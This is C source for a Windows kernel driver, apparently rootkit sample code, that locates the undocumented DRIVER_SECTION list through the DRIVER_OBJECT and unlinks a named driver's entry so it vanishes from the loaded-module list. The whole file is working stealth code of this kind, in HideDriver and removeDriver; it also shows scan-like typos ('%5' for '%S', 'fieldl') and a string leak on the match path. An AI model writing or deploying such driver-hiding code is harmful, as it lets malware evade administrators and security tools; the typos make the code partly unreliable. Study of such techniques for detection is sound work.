#define OFFSET_DRIVERSECTION Offsets.DriverSection

typedef struct _DRIVER_SECTION
{
	LIST_ENTRY listEntry;
	DWORD fieldl[4];
	DWORD field2;
	DWORD field3;
	DWORD field4;
	UNICODE_STRING filePath;
	UNICODE_STRING fileName;
	//...and who knows what else
}DRIVER_SECTION, *PDRIVER_SECTION;

DRIVER_SECTION * getCurrentDriverSection()
{
	BYTE * object;
	DRIVER_SECTION * driverSection;
	//we stored this global reference in DriverEntry()
	object = (UCHAR*)DriverObjectRef;
	//Undocumented DRIVER_SECTION
	//In DRIVER_OBJECT's PVOID DriverSection field (see Wdm.h)
	driverSection = *((PDRIVER_SECTION*)((DWORD)object + OFFSET_DRIVERSECTION));
	return(driverSection);
}

void ListDrivers()
{
	DRIVER_SECTION * currentDS;
	DRIVER_SECTION * firstDS;
	DBG_TRACE(" ListDrivers ", "[ list begin]- - - - - - - - - - - - - - - - - - - - -");
	currentDS = getCurrentDriverSection();
	DBG_PRINT2("\tDriver file=%S", ((*currentDS).fileName).Buffer);
	firstDS = currentDS;
	currentDS = (DRIVER_SECTION*)((*firstDS).listEntry).Flink;
	while (((DWORD)currentDS) != ((DWORD)firstDS))
	{
		DBG_PRINT2("\tDriver file=%S", ((*currentDS).fileName).Buffer);
		currentDS = (DRIVER_SECTION*)((*currentDS).listEntry).Flink;
	}
	DBG_TRACE(" ListDrivers", "[ list end]- - - - - - - - - - - - - - - - - - - - - - -");
	return;
}

void removeDriver(DRIVER_SECTION * currentDS)
{
	LIST_ENTRY * prevDS;
	LIST_ENTRY * nextDS;

	KIRQL irql;
	PKDPC dpcptr;

	irql = RaiseIRQL();
	dpcptr = AcquireLock();

	prevDS = ((*currentDS).listEntry).Blink;
	nextDS = ((*currentDS).listEntry).Flink;

	(*prevDS).Flink = nextDS;
	(*nextDS).Blink = prevDS;

	((*currentDS).listEntry).Flink = (LIST_ENTRY*)currentDS;
	((*currentDS).listEntry).Blink = (LIST_ENTRY*)currentDS;

	ReleaseLock(dpcptr);
	LowerIRQL(irql);
	return;
}

void HideDriver(BYTE* driverName)
{
	ANSI_STRING aDriverName;
	UNICODE_STRING uDriverName;
	NTSTATUS retVal;
	DRIVER_SECTION* currentDS;
	DRIVER_SECTION* firstDS;
	LONG match;
	DBG_TRACE("HideDriver", "Attempt to hide driver initiated");
	DBG_PRINT2("\tdriver name=%s\n", driverName);

	RtlInitAnsiString(&aDriverName, driverName);
	DBG_PRINT2("\tANSI driver name=%s\n", aDriverName.Buffer);

	retVal = RtlAnsiStringToUnicodeString(&uDriverName, &aDriverName, TRUE);
	if (retVal != STATUS_SUCCESS)
	{
		DBG_PRINT2(" [HideDriver] : Unable to convert to Unicode (%s)", driverName);
	}
	DBG_PRINT2(" \tunicode driver name=%5\n", uDriverName.Buffer);
	currentDS = getCurrentDriverSection();
	DBG_PRINT2("\tcurrent DriverSection = %S", ((*currentDS).fileName).Buffer);
	firstDS = currentDS;
	match = RtlCompareUnicodeString(&uDriverName, &((*currentDS).fileName), TRUE);
	if (match == 0)
	{
		DBG_PRINT2("\tfound a match (%5)", ((*currentDS).fileName).Buffer);
		removeDriver(currentDS);
		return;
	}
	currentDS = (DRIVER_SECTION*)((*currentDS).listEntry).Flink;
	while (((DWORD)currentDS) != ((DWORD)firstDS))
	{
		DBG_PRINT2("\tcurrent Driver file=%5", ((*currentDS).fileName).Buffer);
		match = RtlCompareUnicodeString(&uDriverName, &((*currentDS).fileName), TRUE);
		if (match == 0)
		{
			DBG_PRINT2("\tfound a match (%S)", ((*currentDS).fileName).Buffer);
			removeDriver(currentDS);
			return;
		}
		currentDS = (DRIVER_SECTION*)((*currentDS).listEntry).Flink;
	}
	RtlFreeUnicodeString(&uDriverName);

	DBG_PRINT2(" [HideDriver] : Driver (%s) NDT found", driverName);
	DBG_TRACE("HideDriver", "Attempt to hide driver completed");
	return;
}